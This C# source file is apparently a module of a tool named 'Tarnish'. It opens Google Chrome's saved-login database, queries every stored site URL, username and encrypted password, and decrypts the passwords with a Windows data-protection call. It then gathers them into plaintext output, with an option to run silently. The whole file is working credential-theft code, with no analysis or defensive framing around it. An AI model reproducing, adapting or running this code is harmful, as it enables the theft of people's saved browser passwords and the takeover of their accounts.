using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Community.CsharpSqlite;

namespace Tarnish
{
    class ProcChrome : Proc
    {
        List<ChromeUserPassEntity> entities = new List<ChromeUserPassEntity>();
        public string GetPasswords()
        {
            try
            {
                string DBPATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                string FileOut = "";
                if (File.Exists(DBPATH))
                {
                    string header = "Tarnish " + Global.AssemName.Version.ToString();
                    FileOut += header + Environment.NewLine;
                    Sqlite3.sqlite3 db = new Sqlite3.sqlite3();
                    Sqlite3.sqlite3_open(DBPATH, ref db);
                    Sqlite3.sqlite3_exec(db, "SELECT origin_url,username_value,password_value FROM LOGINS", new Sqlite3.dxCallback(The_Callback), 0, 0);
                    foreach (ChromeUserPassEntity e in entities)
                    try
                    {
                        if (e.username_value != null && e.password_value != null && e.origin_url != null)
                            if (e.username_value.Trim().Length > 0)
                            {
                                if (!Config.Silent)
                                    Console.WriteLine(e.origin_url.PadLeft(e.origin_url.Length + 1, ' '));
                                FileOut += e.origin_url + Environment.NewLine + "   " + e.username_value + Environment.NewLine + "   " + e.getPassword() + Environment.NewLine;
                            }
                    }
                    catch (Exception ex) { Console.Write(ex.ToString()); }
                    Sqlite3.sqlite3_close(db);
                    return FileOut;
                }
            }
            catch (Exception ex) { Console.Write(ex.ToString()); }
            return "";
        }
        int The_Callback(object a_param, long argc, object argv, object column)
        {
            string[] argvs = (string[])argv;
            byte[] pw = Encoding.Default.GetBytes(argvs[2]);
            entities.Add(new ChromeUserPassEntity(argvs[0], argvs[1], pw));
            return 0;
        }
        public string Name { get { return "Chrome"; } }
        class ChromeUserPassEntity
        {
            private string _origin_url;
            private string _username_value;
            private byte[] _password_value;
            public string origin_url { get { return _origin_url; } set { _origin_url = value; } }
            public string username_value { get { return _username_value; } set { _username_value = value; } }
            public byte[] password_value { get { return _password_value; } set { _password_value = value; } }
            public string getPassword()
            { return Encoding.Default.GetString(Global.UnprotectData(_password_value, 1)); }
            public ChromeUserPassEntity(string url, string user, byte[] pass)
            { _origin_url = url; _username_value = user; _password_value = pass; }
            public ChromeUserPassEntity(string url, string user, string pass)
            { _origin_url = url; _username_value = user; _password_value = Encoding.ASCII.GetBytes(pass); }
        }
    }
}